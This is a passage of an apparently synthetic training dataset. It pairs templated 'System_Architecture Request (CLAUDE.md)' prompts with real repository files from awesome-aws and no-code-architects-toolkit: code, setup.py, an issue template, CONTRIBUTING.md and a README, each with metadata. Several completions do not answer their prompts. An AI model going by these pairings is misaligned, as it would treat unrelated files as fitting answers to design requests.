extract_repo_params(self, url):\n        \"\"\"Extracts the user login and repo name from a repo url.\n\n        Expects the url to be valid of the form:\n        https://github.com/user/repo/...\n\n        :type regex_match: :class:`sre.SRE_Match`\n        :param regex_match:\n        \"\"\"\n        tokens = url.split('/')\n        POS_USER_ID = 3\n        POS_REPO_NAME = 4\n        return tokens[POS_USER_ID], tokens[POS_REPO_NAME]\n\n    def print_repos_broken(self):\n        \"\"\"Prints out any broken repos.\"\"\"\n        if self.repos_broken:\n            click.secho('Broken repos:', fg='red')\n            for repo in self.repos_broken:\n                click.secho('  ' + repo, fg='red')\n\n    def process_line(self, line):\n        \"\"\"Processes each line in the README.\n\n        :type line: str\n        :param line: The current line in the README.\n        \"\"\"\n        match = re.search(r'(https://github.com/[^)]*)', line)\n        # If we're not processing a repo, just output the line\n        if match is None:\n            self.output.append(line)\n            return\n        # If the repo is in the score exclude list, just output the line\n        if any(substr in match.group(0) for substr in self.repos_exclude_score):\n            self.output.append(line)\n            return\n        user_login, repo_name = self.extract_repo_params(match.group(0))\n        repo = self.github.api.repository(user_login, repo_name)\n        # Tag any broken repos\n        if type(repo) is null.NullObject:\n            self.repos_broken.append(match.group(0))\n            return\n        line = self.update_repo_score(repo, line)\n        self.output.append(line)\n\n    def rock_it(self, readme_path, result_path=None):\n        \"\"\"Processes the README.\n\n        :type readme_path: str\n        :param readme_path: The README file path.\n\n        :type result_path: str\n        :param result_path: The file path of where to output the results.\n        \"\"\"\n        with open(readme_path, 'r') as f:\n            for line in f:\n                line = line.strip('\\n')\n                self.process_line(line)\n        if result_path is None:\n            result_path = readme_path\n        self.write_output(result_path)\n        self.print_repos_broken()\n        click.secho('Rate limit: ' + str(self.github.api.ratelimit_remaining),\n                    fg='blue')\n        click.secho('Updated ' + result_path, fg='blue')\n\n    def score_repo(self, stars, cached_score):\n        \"\"\"Assigns the Fiery Meter of AWSome score.\n\n        :type stars: int\n        :param stars: The number of repo stars.\n\n        :type cached_score: int\n        :param cached_score: The previouslya assigned score.\n        \"\"\"\n        score = cached_score\n        if stars < 100:\n            score = 0 if score != 0 else cached_score\n        elif stars < 200:\n            score = 1 if score != 1 else cached_score\n        elif stars < 500:\n            score = 2 if score != 2 else cached_score\n        elif stars < 1000:\n            score = 3 if score != 3 else cached_score\n        elif stars < 2000:\n            score = 4 if score != 4 else cached_score\n        else:\n            score = 5 if score != 5 else cached_score\n        return score\n\n    def update_repo_score(self, repo, line):\n        \"\"\"Updates the repo's markdown, given its new score.\n\n        :type repo: :class:`github3.repos.repo.Repository`\n        :param repo: Contains repo information.\n\n        :type line: str\n        :param line: The current line of the README.\n        \"\"\"\n        stars = repo.stargazers_count\n        cached_score = line.count(':fire:')\n        score = self.score_repo(stars, cached_score)\n        if score != cached_score:\n            prefix = ''\n            if cached_score == 0:\n                prefix = ' '\n            cached_fires = ':fire:' * cached_score\n            fires = ':fire:' * score\n            line = line.replace(cached_fires + ']', prefix + fires + ']')\n        return line\n\n    def write_output(self, result_path):\n        \"\"\"Writes the results to the result_path.\n\n        :type result_path: str\n        :param result_path: The file path specifying where to write the output.\n        \"\"\"\n        with open(result_path, 'w') as f:\n            for output in self.output:\n                f.write(output + '\\n')\n", "metadata": {"source": "github.com/donnemartin/awesome-aws", "file_path": "awesome/awesome.py", "language": "python", "complexity": "medium", "star_count": 13620, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 167}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from awesome.__init__ import __version__\ntry:\n    from setuptools import setup, find_packages\nexcept ImportError:\n    from distutils.core import setup\n\nsetup(\n    description='A curated list of awesome Amazon Web Services (AWS) libraries, open source repos, guides, blogs, and other resources.',\n    author='Donne Martin',\n    url='https://github.com/donnemartin/awesome-aws',\n    download_url='https://github.com/donnemartin/awesome-aws',\n    author_email='donne.martin@gmail.com',\n    version=__version__,\n    license='Creative Commons Attribution 4.0',\n    install_requires=[\n        'click>=5.1',\n        'githubcli>=0.1.0',\n        'colorama>=0.3.3',\n    ],\n    extras_require={\n        'testing': [\n            'mock>=1.0.1',\n            'tox>=1.9.2'\n        ],\n    },\n    entry_points={\n        'console_scripts': 'awesome = awesome.awesome_cli:AwesomeCli.cli'\n    },\n    packages=find_packages(),\n    scripts=[],\n    name='awesome-aws',\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'Natural Language :: English',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "metadata": {"source": "github.com/donnemartin/awesome-aws", "file_path": "setup.py", "language": "python", "complexity": "simple", "star_count": 13620, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 47}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Bug Report\ntitle: \"[Bug]: \"\nlabels: [\"bug\"]\ndescription: Report broken or incorrect behaviour\nbody:\n  - type: markdown\n    attributes:\n      value: >\n        Thanks for taking the time to fill out a bug.\n        Please note that this form is for bugs only!\n  - type: textarea\n    id: what-happened\n    attributes:\n      label: Describe the bug\n      description: A clear and concise description of what the bug is.\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Reproduction Steps\n      description: >\n         What you did to make it happen. Include any request payloads, API calls, or specific commands used.\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Expected behavior\n      description: >\n         A clear and concise description of what you expected to happen.\n    validations:\n      required: false\n  - type: textarea\n    attributes:\n      label: Screenshots and relevant files\n      description: >\n         If applicable, add screenshots or relevant files to help explain your problem.\n    validations:\n      required: false\n  - type: dropdown\n    id: platform\n    attributes:\n      label: \"Platform\"\n      description: \"Select the platform where you encountered this bug\"\n      options:\n        - \"Google Cloud Platform\"\n        - \"Digital Ocean\"\n        - \"Local\"\n        - \"Other\"\n    validations:\n      required: true\n  - type: dropdown\n    id: assign\n    attributes:\n      label: \"Would you like to work on this issue?\"\n      options:\n        - \"Yes\"\n  - type: checkboxes\n    attributes:\n      label: Checklist\n      description: >\n        Let's make sure you've properly done due diligence when reporting this issue!\n      options:\n        - label: I have searched the open issues for duplicates.\n          required: true\n        - label: I have shown the entire traceback, if possible.\n          required: true\n  - type: textarea\n    attributes:\n      label: Additional Context\n      description: Add any other context about the problem here.\n", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": ".github/ISSUE_TEMPLATE/bug_report.yml", "language": "yaml", "complexity": "simple", "star_count": 1557, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 71}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contributing to No-Code Architects Toolkit\n\nThanks for your interest in contributing! ❤️\n\nThis project exists to help **non-technical creators build smarter systems** — so every contribution should align with these core principles:\n\n✅ Simple\n✅ Useful\n✅ Low-maintenance\n\nThis repository is focused on new contributions and feature development. Please ensure all pull requests contain complete, debugged code that is ready for review. We do not accept submissions that require significant cleanup, completion work, or debugging by maintainers.\n\n> If you like the project but don't know how to code, you can still support us in other ways:\n>\n> * ⭐ Star the project\n> * 📣 Share it on social media\n> * 🌲 Refer it to a friend or your community\n> * 💸 [Sponsor the project](#)\n\nIf you need help or have questions, check out the GitHub [discussions](https://github.com/stephengpope/no-code-architects-toolkit/discussions) or join the [community](https://www.skool.com/no-code-architects/about?ref=2f302c52a77541efa2dd5e8b27f3f8c9).\n\n---\n\n## Table of Contents\n\n* [What We Accept](#what-we-accept-)\n* [What We Reject](#what-we-reject-)\n* [Feature Evaluation Framework](#feature-evaluation-framework)\n* [Technical Guidelines](#technical-guidelines)\n* [Contribution Types](#contribution-types)\n* [Branch Naming Conventions](#branch-naming-conventions)\n* [Final Thoughts](#final-thoughts-%EF%B8%8F)\n\n---\n\n## What We Accept ✅\n\n* Solves **common no-code challenges**\n* **Reduces cost** or replaces paid APIs/tools\n* Requires minimal input (has defaults)\n* Is understandable by **non-technical users**\n* Works out-of-the-box, no setup required\n* One-time integrations — **no constant maintenance needed**\n* Uses **existing input/output naming conventions**\n* Follows our directory and structure conventions\n\n---\n\n## What We Reject ❌\n\n* Features built for one person or edge-case\n* Inconsistent input/output field names\n* Requires polling, retries, or callback logic\n* Needs babysitting or breaks frequently\n* Lacks error handling or code comments\n* Includes unused code, requirements, or bloat\n* Adds huge packages that inflate Docker image size\n* Leaves us with more work to do\n\n---\n\n## Feature Evaluation Framework\n\n| Category              | Ask This...                                    | ✅ Accept if...                                 | ❌ Reject if...                             |\n| --------------------- | ---------------------------------------------- | ---------------------------------------------- | ------------------------------------------ |\n| **Mission Fit**       | Does this reduce cost or unify tools?          | Replaces APIs, reduces costs or complexity     | Adds noise or solves narrow edge cases     |\n| **Input Familiarity** | Are inputs familiar (`file_url`, `text`, etc)? | Uses standard names/types already in use       | Introduces new terms for same ideas        |\n| **Input Clarity**     | Would a non-tech user know what to enter?      | Inputs like \"Enter URL\", \"Choose format\"       | Needs tech explanation or experimentation  |\n| **Output Usefulness** | Can this plug straight into Make/Zapier?       | Returns clean files, text, URLs                | Returns raw data or deep nested structures |\n| **Reliability**       | Will it just work?                             | API is stable, no retries, consistent behavior | Depends on flaky APIs or fragile setup     |\n| **Maintenance Cost**  | Will we have to maintain this?                 | One-and-done, doesn't change often             | Vendor changes often, breaks silently      |\n| **Value vs. Effort**  | Is it worth it?                                | High impact, frequently requested              | Niche, low ROI                             |\n\n---\n\n## Technical Guidelines\n\n> These guidelines help maintain a clean and production-ready project.\n\n### 🧠 Code Style\n\n* Use **clear, descriptive names** (e.g., `convertImageToText`, not `imgTxt`)\n* Comment your logic if it's not obvious\n* Handle errors — don't let code crash silently\n* Follow consistent formatting\n\n\n### 🧼 Clean Contributions\n\n* Don't change files unrelated to your feature\n* Don't leave behind unused requirements or code\n* Don't introduce huge dependencies (we check image size)\n* Use `git status` to review your working tree before you commit\n---\n\n## Branch Naming Conventions\n\nAll contributions should follow this process:\n\n1. Fork the [main repository](https://github.com/stephengpope/no-code-architects-toolkit)\n2. Clone your fork:\n   ```bash\n   git clone https://github.com/YOUR_USERNAME/no-code-architects-toolkit.git\n   cd no-code-architects-toolkit\n   ```\n3. Add the upstream repository:\n   ```bash\n   git remote add upstream https://github.com/stephengpope/no-code-architects-toolkit.git\n   ```\n4. Fetch and checkout the upstream build branch:\n   ```bash\n   git fetch upstream\n   git checkout -b your-feature-branch upstream/build\n   ```\n5. Name your feature branch following these patterns:\n   * For bug fixes: `fix/descriptive-bug-name`\n   * For new features: `feature/descriptive-feature-name`\n   * For documentation: `docs/descriptive-change`\n\nExample:\n```bash\n# For a new feature\ngit fetch upstream\ngit checkout -b feature/pdf-to-text-converter upstream/build\n\n# For a bug fix\ngit fetch upstream\ngit checkout -b fix/webp-upload-crash upstream/build\n```\n\n6. After making your changes, push to your fork and create a pull request:\n   ```bash\n   git push origin your-feature-branch\n   ```\n   Then visit your fork on GitHub and create a pull request targeting the `build` branch of the main repository.\n\n---\n\n## Contribution Types\n\n| Type        | Good Example                                                           |\n| ----------- | ---------------------------------------------------------------------- |\n| 🐞 Bug Fix  | \"Fixes crash when uploading WebP files\"                                |\n| ⚡ Feature   | \"Adds endpoint to replace an expensive api\" |\n|   📚 Docs | \"Improves deployment documentation (e.g., how to host on Netlify, AWS, Vercel, etc.)\" |\n\n\n---\n\n## Final Thoughts 🧘‍♂️\n\n* If it's not ready, don't submit it.\n* Contributions should be helpful, obvious, and low-maintenance.\n* The goal: **make complex tasks simple for no-code users**.\n\nWe're excited to see your contributions! 🎉\n\nLet's build something useful, together.", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "CONTRIBUTING.md", "language": "markdown", "complexity": "medium", "star_count": 1557, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 158}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\n![Original Logo Symbol](https://github.com/user-attachments/assets/75173cf4-2502-4710-998b-6b81740ae1bd)\n\n# No-Code Architects Toolkit API \n\nTired of wasting thousands of dollars on API subscriptions to support all your automations? What if there was a free alternative?\n\nThe 100% FREE No-Code Architects Toolkit API processes different types of media. It is built in Python using Flask.\n\n## What Can It Do?\n\nThe API can convert audio files. It creates transcriptions of content. It translates content between languages. It adds captions to videos. It can do very complicated media processing for content creation. The API can also manage files across multiple cloud services like Google Drive, Amazon S3, Google Cloud Storage, and Dropbox.\n\nYou can deploy this toolkit in several ways. It works with Docker. It runs on Google Cloud Platform. It functions on Digital Ocean. You can use it with any system that hosts Docker.\n\nEasily replace services like ChatGPT Whisper, Cloud Convert, Createomate, JSON2Video, PDF(dot)co, Placid and OCodeKit.\n\n## 👥 No-Code Architects Community\n\nWant help? Join a supportive community and get dedicated tech support.\n\nJoin the ONLY community where you learn to leverage AI automation and content to grow your business (and streamline your biz).\n\nWho's this for?\n- Coaches and consultants\n- AI Automation agencies\n- SMMA & Content agencies\n- SaaS Startup Founders\n\nGet courses, community, support, daily calls and more.\n\nJoin the **[No-Code Architects Community](https://www.skool.com/no-code-architects)** today!\n\n---\n\n## API Endpoints\n\nEach endpoint is supported by robust payload validation and detailed API documentation to facilitate easy integration and usage.\n\n### Audio\n\n- **[`/v1/audio/concatenate`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/audio/concatenate.md)**\n  - Combines multiple audio files into a single audio file.\n\n### Code\n\n- **[`/v1/code/execute/python`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/code/execute/execute_python.md)**\n  - Executes Python code remotely and returns the execution results.\n\n### FFmpeg\n\n- **[`/v1/ffmpeg/compose`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/ffmpeg/ffmpeg_compose.md)**\n  - Provides a flexible interface to FFmpeg for complex media processing operations.\n\n### Image\n\n- **[`/v1/image/convert/video`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/image/convert/image_to_video.md)**\n  - Transforms a static image into a video with custom duration and zoom effects.\n\n- **[`/v1/image/screenshot/webpage`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/image/screenshot_webpage.md)**\n  - Captures screenshots of web pages using Playwright with advanced options like viewport size, device emulation, and custom HTML/CSS/JS injection.\n\n### Media\n\n- **[`/v1/media/convert`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/media/convert/media_convert.md)**\n  - Converts media files from one format to another with customizable codec options.\n\n- **[`/v1/media/convert/mp3`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/media/convert/media_to_mp3.md)**\n  - Converts various media formats specifically to MP3 audio.\n\n- **[`/v1/BETA/media/download`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/media/download.md)**\n  - Downloads media content from various online sources using yt-dlp.\n\n- **[`/v1/media/feedback`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/media/feedback.md)**\n  - Provides a web interface for collecting and displaying feedback on media content.\n\n- **[`/v1/media/transcribe`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/media/media_transcribe.md)**\n  - Transcribes or translates audio/video content from a provided media URL.\n\n- **[`/v1/media/silence`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/media/silence.md)**\n  - Detects silence intervals in a given media file.\n\n- **[`/v1/media/metadata`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/media/metadata.md)**\n  - Extracts comprehensive metadata from media files including format, codecs, resolution, and bitrates.\n\n### S3\n\n- **[`/v1/s3/upload`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/s3/upload.md)**\n  - Uploads files to Amazon S3 storage by streaming directly from a URL.\n\n### Toolkit\n\n- **[`/v1/toolkit/authenticate`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/toolkit/authenticate.md)**\n  - Provides a simple authentication mechanism to validate API keys.\n\n- **[`/v1/toolkit/test`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/toolkit/test.md)**\n  - Verifies that the NCA Toolkit API is properly installed and functioning.\n\n- **[`/v1/toolkit/job/status`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/toolkit/job_status.md)**\n  - Retrieves the status of a specific job by its ID.\n\n- **[`/v1/toolkit/jobs/status`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/toolkit/jobs_status.md)**\n  - Retrieves the status of all jobs within a specified time range.\n\n### Video\n\n- **[`/v1/video/caption`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/video/caption_video.md)**\n  - Adds customizable captions to videos with various styling options.\n\n- **[`/v1/video/concatenate`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/video/concatenate.md)**\n  - Combines multiple videos into a single continuous video file.\n\n- **[`/v1/video/thumbnail`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/video/thumbnail.md)**\n  - Extracts a thumbnail image from a specific timestamp in a video.\n\n- **[`/v1/video/cut`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/video/cut.md)**\n  - Cuts specified segments from a video file with optional encoding settings.\n\n- **[`/v1/video/split`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/video/split.md)**\n  - Splits a video into multiple segments based on specified start and end times.\n\n- **[`/v1/video/trim`](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/video/trim.md)**\n  - Trims a video by keeping only the content between specified start and end times.\n\n---\n\n## Docker Build and Run\n\n### Build the Docker Image\n\n   ```bash\n   docker build -t no-code-architects-toolkit .\n   ```\n\n### General Environment Variables\n\n#### `API_KEY`\n- **Purpose**: Used for API authentication.\n- **Requirement**: Mandatory.\n\n---\n\n### S3-Compatible Storage Environment Variables\n\n#### `S3_ENDPOINT_URL`\n- **Purpose**: Endpoint URL for the S3-compatible service.\n- **Requirement**: Mandatory if using S3-compatible storage.\n\n#### `S3_ACCESS_KEY`\n- **Purpose**: The access key for the S3-compatible storage service.\n- **Requirement**: Mandatory if using S3-compatible storage.\n\n#### `S3_SECRET_KEY`\n- **Purpose**: The secret key for the S3-compatible storage service.\n- **Requirement**: Mandatory if using S3-compatible storage.\n\n#### `S3_BUCKET_NAME`\n- **Purpose**: The bucket name for the S3-compatible storage service.\n- **Requirement**: Mandatory if using S3-compatible storage.\n\n#### `S3_REGION`\n- **Purpose**: The region for the S3-compatible storage service.\n- **Requirement**: Mandatory if using S3-compatible storage, \"None\" is acceptible for some s3 providers.\n\n---\n\n### Google Cloud Storage (GCP) Environment Variables\n\n#### `GCP_SA_CREDENTIALS`\n- **Purpose**: The JSON credentials for the GCP Service Account.\n- **Requirement**: Mandatory if using GCP storage.\n\n#### `GCP_BUCKET_NAME`\n- **Purpose**: The name of the GCP storage bucket.\n- **Requirement**: Mandatory if using GCP storage.\n\n---\n\n### Performance Tuning Variables\n\n#### `MAX_QUEUE_LENGTH`\n- **Purpose**: Limits the maximum number of concurrent tasks in the queue.\n- **Default**: 0 (unlimited)\n- **Recommendation**: Set to a value based on your server resources, e.g., 10-20 for smaller instances.\n\n#### `GUNICORN_WORKERS`\n- **Purpose**: Number of worker processes for handling requests.\n- **Default**: Number of CPU cores + 1\n- **Recommendation**: 2-4× number of CPU cores for CPU-bound workloads.\n\n#### `GUNICORN_TIMEOUT`\n- **Purpose**: Timeout (in seconds) for worker processes.\n- **Default**: 30\n- **Recommendation**: Increase for processing large media files (e.g., 300-600).\n\n---\n\n### Storage Configuration\n\n#### `LOCAL_STORAGE_PATH`\n- **Purpose**: Directory for temporary file storage during processing.\n- **Default**: /tmp\n- **Recommendation**: Set to a path with sufficient disk space for your expected workloads.\n\n### Notes\n- Ensure all required environment variables are set based on the storage provider in use (GCP or S3-compatible). \n- Missing any required variables will result in errors during runtime.\n- Performance variables can be tuned based on your workload and available resources.\n\n### Run the Docker Container:\n\n   ```bash\n   docker run -d -p 8080:8080 \\\n     # Authentication (required)\n     -e API_KEY=your_api_key \\\n     \n     # Cloud storage provider (choose one)\n\n     # s3\n     #\n     #-e S3_ENDPOINT_URL=https://nyc3.digitaloceanspaces.com \\\n     #-e S3_ACCESS_KEY=your_access_key \\\n     #-e S3_SECRET_KEY=your_secret_key \\\n     #-e S3_BUCKET_NAME=your_bucket_name \\\n     #-e S3_REGION=nyc3 \\\n\n     # Or\n\n     # GCP Storage\n     #\n     #-e GCP_SA_CREDENTIALS='{\"your\":\"service_account_json\"}' \\\n     #-e GCP_BUCKET_NAME=your_gcs_bucket_name \\\n     \n     # Local storage configuration (optional)\n     -e LOCAL_STORAGE_PATH=/tmp \\\n     \n     # Performance tuning (optional)\n     -e MAX_QUEUE_LENGTH=10 \\\n     -e GUNICORN_WORKERS=4 \\\n     -e GUNICORN_TIMEOUT=300 \\\n     \n     no-code-architects-toolkit\n   ```\n\n---\n\n## Installation Guides\n\nThis API can be deployed to various cloud platforms:\n\n### Digital Ocean\n\nThe Digital Ocean App platform is pretty easy to set up and get going, but it can cost more then other cloud providers.\n\n#### Important: Long running processes\n\nYou need to use the \"webhook_url\" (for any request that exceeds 1 min) in your API payload to avoid timeouts due to CloudFlair proxy timeout.\n\nIf you use the webhook_url, there is no limit to the processing length.\n\n- [Digital Ocean App Platform Installation Guide](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/cloud-installation/do.md) - Deploy the API on Digital Ocean App Platform\n\n### Google Cloud RUN Platform\n\nSometimes difficult for people to install (especially on Google Business Workspaces), lots of detailed security exceptions.\n\nHowever this is one of the cheapest options with great performance because you're only charged when the NCA Toolkit is processesing a request.\n\nOutside of that you are not charged.\n\n#### Imporatnt: Requests exceeding 5+ minutes can be problemactic \n\nGCP Run will terminate long rununing processes, which can happen when processing larger files (whether you use the webhook_url or not).\n\nHowever, when your processing times are consistant lower than 5 minutes (e.g. you're only process smaller files), it works great! The performance is also great and as soon as you stop making requests you stop paying.\n\nThey also have a GPU option that might be usable for better performance (untested).\n\n- [Google Cloud RUN Platform (GCP) Installation Guide](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docs/cloud-installation/gcp.md) - Deploy the API on Google Cloud Run\n\n### General Docker Instructions\n\nYou can use these instructions to deploy the NCA Toolkit to any linux server (on any platform)\n\nYou can more easily control performance and cost this way, but requires more technical skill to get up and running (not much though).\n\n- [General Docker Compose Installation Guide](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docker-compose.md)\n\n### Local Development with MinIO and n8n\n\nFor local development with integrated S3-compatible storage and workflow automation:\n\n- [Local Development with MinIO and n8n Guide](https://github.com/stephengpope/no-code-architects-toolkit/blob/main/docker-compose.local.minio.n8n.md) - Complete local development environment with MinIO storage and n8n workflow automation\n\n## Testing the API\n\n1. Install the **[Postman Template](https://bit.ly/49Gkh61)** on your computer\n2. Import the API example requests from the template\n3. Configure your environment variables in Postman:\n   - `base_url`: Your deployed API URL\n   - `x-api-key`: Your API key configured during installation\n4. Use the example requests to validate that the API is functioning correctly\n5. Use the **[NCA Toolkit API GPT](https://bit.ly/4feDDk4)** to explore additional features\n\n---\n\n## Contributing To the NCA Toolkit API\n\nWe welcome contributions from the public! If you'd like to contribute to this project, please follow these steps:\n\n1. Fork the repository\n2. Create a new branch for your feature or bug fix\n3. Make your changes\n4. Submit a pull request to the \"build\" branch\n\n### Pull Request Process\n\n1. Ensure any install or build dependencies are removed before the end of the layer when doing a build.\n2. Update the README.md with details of changes to the interface, this includes new environment variables, exposed ports, useful file locations and container parameters.\n\n### Adding New Routes\n\nIf you want to add new API endpoints, check out our [Adding Routes Guide](docs/adding_routes.md) to learn how to use the dynamic route registration system.\n\nThank you for your contributions!\n\n---\n\n## How To Get Support\n\nGet courses, community, support daily calls and more.\n\nJoin the **[No-Code Architects Community](https://www.skool.com/no-code-architects)** today!\n\n## License\n\nThis project is licensed under the [GNU General Public License v2.0 (GPL-2.0)](LICENSE).\n", "metadata": {"source": "github.com/stephengpope/no-code-architects-toolkit", "file_path": "README.md", "language": "markdown", "complexity": "complex", "star_count": 1557, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 338}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2025 Stephen G. Pope\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License along\n# with this program; if not, write to the Free Software Foundation, Inc.,\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n\n\n\nfrom flask import Flask, request\nfrom queue import Queue\nfrom services.webhook import send_webhook\nimport threading\nimport uuid\nimport os\nimport time\nfrom version import BUILD_NUMBER  # Import the BUILD_NUMBER\nfrom app_utils import log_job_status, discover_and_register_blueprints  # Import the discover_and_register_blueprints function\n\nMAX_QUEUE_LENGTH = int(os.environ.get('MAX_QUEUE_LENGTH', 0))\n\ndef create_app():\n    app = Flask(__name__)\n\n    # Create a queue to hold tasks\n    task_queue = Queue()\n    queue_id = id(task_queue)  # Generate a single queue_id for this worker\n\n    # Function to process tasks from the queue\n    def process_queue():\n        while True:\n            job_id, data, task_func, queue_start_time = task_queue.get()\n            queue_time = time.time() - queue_start_time\n            run_start_time = time.time()\n            pid = os.getpid()  # Get the PID of the actual processing thread\n            \n            # Log job status as running\n            log_job_status(job_id, {\n                \"job_status\": \"running\",\n                \"job_id\": job_id,\n                \"queue_id\": queue_id,\n                \"process_id\": pid,\n                \"response\": None\n            })\n            \n            response = task_func()\n            run_time = time.time() - run_start_time\n            total_time = time.time() - queue_start_time\n\n            response_data = {\n                \"endpoint\": response[1],\n                \"code\": response[2],\n                \"id\": data.get(\"id\"),\n                \"job_id\": job_id,\n                \"response\": response[0] if response[2] == 200 else None,\n                \"message\": \"success\" if response[2] == 200 else response[0],\n                \"pid\": pid,\n                \"queue_id\": queue_id,\n                \"run_time\": round(run_time, 3),\n                \"queue_time\": round(queue_time, 3),\n                \"total_time\": round(total_time, 3),\n                \"queue_length\": task_queue.qsize(),\n                \"build_number\": BUILD_NUMBER  # Add build number to response\n            }\n            \n            # Log job status as done\n            log_job_status(job_id, {\n                \"job_status\": \"done\",\n                \"job_id\": job_id,\n                \"queue_id\": queue_id,\n                \"process_id\": pid,\n                \"response\": response_data\n            })\n\n            # Only send webhook if webhook_url has an actual value (not an empty string)\n            if data.get(\"webhook_url\") and data.get(\"webhook_url\") != \"\":\n                send_webhook(data.get(\"webhook_url\"), response_data)\n\n            task_queue.task_done()\n\n    # Start the queue processing in a separate thread\n    threading.Thread(target=process_queue, daemon=True).start()\n\n    # Decorator to add tasks to the queue or bypass it\n    def queue_task(bypass_queue=False):\n        def decorator(f):\n            def wrapper(*args, **kwargs):\n                job_id = str(uuid.uuid4())\n                data = request.json if request.is_json else {}\n                pid = os.getpid()  # Get PID for non-queued tasks\n                start_time = time.time()\n                \n                if bypass_queue or 'webhook_url' not in data:\n                    \n                    # Log job status as running immediately (bypassing queue)\n                    log_job_status(job_id, {\n                        \"job_status\": \"running\",\n                        \"job_id\": job_id,\n                        